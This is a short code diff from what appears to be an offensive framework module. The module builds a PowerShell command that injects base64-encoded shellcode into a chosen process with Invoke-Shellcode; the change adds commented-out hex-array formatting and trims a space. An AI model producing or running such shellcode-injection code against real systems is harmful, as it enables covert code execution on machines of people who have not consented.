@@ -147,6 +147,9 @@ class Module:
 
         # Add any arguments to the end execution of the script
         
-        script += "\n Invoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(procID, encoded_sc)
+        #t = iter(sc)
+        #pow_array = ',0x'.join(a+b for a,b in zip(t, t))
+        #pow_array = "@(0x" + pow_array + " )"
+        script += "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(procID, encoded_sc)
         script += scriptEnd
         return script
